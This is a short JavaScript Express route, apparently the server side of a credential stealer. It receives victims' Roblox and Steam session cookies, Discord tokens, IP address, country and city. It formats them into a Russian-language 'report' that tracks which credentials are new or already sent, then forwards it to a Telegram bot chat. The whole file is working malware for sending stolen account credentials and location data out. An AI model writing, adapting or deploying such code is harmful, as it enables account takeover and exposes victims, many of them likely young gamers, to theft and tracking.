app.post('/send', async (req, res) => {
    try {
        const { robloxCookie, steamCookie, discordToken, robloxStatus, steamStatus, discordStatus, ip, country, city } = req.body;

        let msg = "🔴 <b>⚠️ ОТЧЁТ</b>\n\n";
        msg += "━━━━━━━━━━━━━━━━━━\n\n";
        msg += "🌐 <b>IP:</b> <code>" + (ip || "Н/Д") + "</code>\n";
        msg += "📍 <b>Страна:</b> <code>" + (country || "Н/Д") + "</code>\n";
        msg += "🏙 <b>Город:</b> <code>" + (city || "Н/Д") + "</code>\n\n";
        msg += "━━━━━━━━━━━━━━━━━━\n\n";

        msg += "🍪 <b>ROBLOX COOKIE:</b>\n";
        if (robloxStatus === "new") msg += "<code>" + robloxCookie + "</code>\n\n";
        else if (robloxStatus === "sent") msg += "✅ Уже отправлен\n\n";
        else msg += "❌ Не найден\n\n";

        msg += "🎮 <b>STEAM COOKIE:</b>\n";
        if (steamStatus === "new") msg += "<code>" + steamCookie + "</code>\n\n";
        else if (steamStatus === "sent") msg += "✅ Уже отправлен\n\n";
        else msg += "❌ Не найден\n\n";

        msg += "💬 <b>DISCORD TOKEN:</b>\n";
        if (discordStatus === "new") msg += "<code>" + discordToken + "</code>\n\n";
        else if (discordStatus === "sent") msg += "✅ Уже отправлен\n\n";
        else msg += "❌ Discord не открыт\n\n";

        msg += "━━━━━━━━━━━━━━━━━━\n";
        msg += "⏰ <b>Время:</b> " + new Date().toLocaleString("ru-RU");

        await axios.post(API + "/sendMessage", {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: "HTML"
        });

        res.json({ ok: true });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});
